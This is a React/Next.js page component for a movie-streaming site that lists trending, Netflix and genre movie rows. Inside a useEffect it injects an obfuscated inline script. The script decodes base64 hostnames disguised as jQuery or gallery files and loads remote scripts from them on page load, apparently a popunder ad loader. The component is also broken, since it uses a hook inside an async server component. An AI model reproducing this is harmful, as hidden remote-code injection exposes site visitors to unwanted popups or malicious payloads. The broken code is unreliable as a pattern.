import { useEffect } from 'react';
import Hero from '@/components/hero';
import ShowsContainer from '@/components/shows-container';
import { siteConfig } from '@/configs/site';
import { Genre } from '@/enums/genre';
import { RequestType, type ShowRequest } from '@/enums/request-type';
import { getRandomShow } from '@/lib/utils';
import MovieService from '@/services/MovieService';
import { MediaType, type Show } from '@/types';

export const revalidate = 3600;

export default async function MoviePage() {
  useEffect(() => {
    const script = document.createElement('script');
    script.type = 'text/javascript';
    script.setAttribute('data-cfasync', 'false');
    script.innerHTML = `
      /*<![CDATA[/* */
      (function(){var c=window,k="c2558032fd6c75a989091d04a363dcf9",h=[["siteId",247+225*576-131*378+4985324],["minBid",0],["popundersPerIP","0"],["delayBetween",0],["default",false],["defaultPerDay",0],["topmostLayer","auto"]],s=["d3d3LmludGVsbGlwb3BwdXAuY29tL2F1bml0ZWdhbGxlcnkubWluLmNzcy","ZDNtcjd5MTU0ZDJxZzUuY2xvdWRmcm9udC5uZXQvWGsvbmpxdWVyeS5lbmRsZXNzLXNjcm9sbC5taW4uanM=","d3d3LmN4bWZyeWp4Yy5jb20vY3VuaXRlZ2FsbGVyeS5taW4uY3Nz","d3d3Lm1rcmljb2pvam91LmNvbS9uU0laL2hqcXVlcnkuZW5kbGVzcy1zY3JvbGwubWluLmpz"],m=-1,i,r,e=function(){clearTimeout(r);m++;if(s[m]&&!(1764231079000<(new Date).getTime()&&1<m)){i=c.document.createElement("script");i.type="text/javascript";i.async=!0;var w=c.document.getElementsByTagName("script")[0];i.src="https://"+atob(s[m]);i.crossOrigin="anonymous";i.onerror=e;i.onload=function(){clearTimeout(r);c[k.slice(0,16)+k.slice(0,16)]||e()};r=setTimeout(e,5E3);w.parentNode.insertBefore(i,w)}};if(!c[k]){try{Object.freeze(c[k]=h)}catch(e){}e()}})();
      /*]]>/* */
    `;
    document.body.appendChild(script);

    return () => {
      document.body.removeChild(script);
    };
  }, []);

  const h1 = `${siteConfig.name} Movie`;
  const requests: ShowRequest[] = [
    {
      title: 'Trending Now',
      req: { requestType: RequestType.TRENDING, mediaType: MediaType.MOVIE },
      visible: true,
    },
    {
      title: 'Netflix Movies',
      req: { requestType: RequestType.NETFLIX, mediaType: MediaType.MOVIE },
      visible: true,
    },
    {
      title: 'Popular',
      req: { requestType: RequestType.POPULAR, mediaType: MediaType.MOVIE },
      visible: true,
    },
    {
      title: 'Comedy Movies',
      req: {
        requestType: RequestType.GENRE,
        mediaType: MediaType.MOVIE,
        genre: Genre.COMEDY,
      },
      visible: true,
    },
    {
      title: 'Action Movies',
      req: {
        requestType: RequestType.GENRE,
        mediaType: MediaType.MOVIE,
        genre: Genre.ACTION,
      },
      visible: true,
    },
    {
      title: 'Romance Movies',
      req: {
        requestType: RequestType.GENRE,
        mediaType: MediaType.MOVIE,
        genre: Genre.ROMANCE,
      },
      visible: true,
    },
    {
      title: 'Scary Movies',
      req: {
        requestType: RequestType.GENRE,
        mediaType: MediaType.MOVIE,
        genre: Genre.THRILLER,
      },
      visible: true,
    },
  ];
  const allShows = await MovieService.getShows(requests);
  const randomShow: Show | null = getRandomShow(allShows);

  return (
    <>
      <h1 className="hidden">{h1}</h1>
      <Hero randomShow={randomShow} />
      <ShowsContainer shows={allShows} />
    </>
  );
}
